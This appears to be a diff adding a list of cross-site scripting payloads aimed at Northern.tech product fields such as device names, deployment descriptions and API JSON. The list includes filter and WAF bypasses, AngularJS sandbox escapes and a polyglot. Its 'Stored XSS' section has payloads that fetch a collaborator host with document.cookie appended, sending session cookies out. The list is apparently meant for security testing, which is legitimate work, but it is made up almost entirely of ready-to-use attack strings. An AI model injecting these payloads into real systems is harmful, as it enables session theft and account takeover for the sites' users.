@@ -1,0 +1,92 @@
+# XSS Payloads for Northern.tech Testing
+# Test in: device names, group names, deployment descriptions, user profiles
+
+## Basic XSS
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+<iframe src="javascript:alert('XSS')">
+<body onload=alert('XSS')>
+
+## Event Handlers
+<input onfocus=alert('XSS') autofocus>
+<select onfocus=alert('XSS') autofocus>
+<textarea onfocus=alert('XSS') autofocus>
+<keygen onfocus=alert('XSS') autofocus>
+<video><source onerror="alert('XSS')">
+<audio src=x onerror=alert('XSS')>
+
+## Encoded
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+<script>alert(String.fromCharCode(88,83,83))</script>
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">
+
+## Attribute Breaking
+" autofocus onfocus=alert('XSS') x="
+' autofocus onfocus=alert('XSS') x='
+"onmouseover="alert('XSS')
+'onmouseover='alert('XSS')
+
+## JavaScript Context
+';alert('XSS');//
+';alert('XSS');//
+\';alert('XSS');//
+';alert(String.fromCharCode(88,83,83))//
+
+## URL Context
+javascript:alert('XSS')
+data:text/html,<script>alert('XSS')</script>
+vbscript:msgbox('XSS')
+
+## Filter Bypass
+<script>alert(1)</script>
+<script>confirm(1)</script>
+<script>prompt(1)</script>
+<script>alert`1`</script>
+<script>alert(/XSS/)</script>
+
+## AngularJS (if used)
+{{constructor.constructor('alert(1)')()}}
+{{$eval.constructor('alert(1)')()}}
+{{$on.constructor('alert(1)')()}}
+
+## React XSS (if used)
+javascript:alert(1)
+javascript&#58;alert(1)
+
+## Stored XSS - Detection Payloads
+<script>fetch('https://yourburpcollaborator.com?c='+document.cookie)</script>
+<img src=x onerror="fetch('https://yourburpcollaborator.com?c='+document.cookie)">
+<svg/onload="fetch('https://yourburpcollaborator.com?c='+document.cookie)">
+
+## DOM XSS
+#<img src=x onerror=alert(1)>
+?search=<img src=x onerror=alert(1)>
+
+## Filter Evasion
+<ScRiPt>alert(1)</sCrIpT>
+<script>alert(1);</script>
+<script>alert(1)  </script>
+<script
+>alert(1)</script>
+
+## WAF Bypass
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<marquee onstart=alert(1)>
+<details open ontoggle=alert(1)>
+
+## Polyglot
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+
+## Test device name limits
+TEST_DEVICE_<script>alert(1)</script>
+TEST"onload="alert(1)
+TEST'onload='alert(1)
+
+## Test description fields
+Normal description <img src=x onerror=alert(1)>
+Deployment description with payload: <svg onload=alert('XSS')>
+
+## JSON Context (for API)
+{"name":"test\"><script>alert(1)</script>"}
+{"description":"test'><img src=x onerror=alert(1)>"}
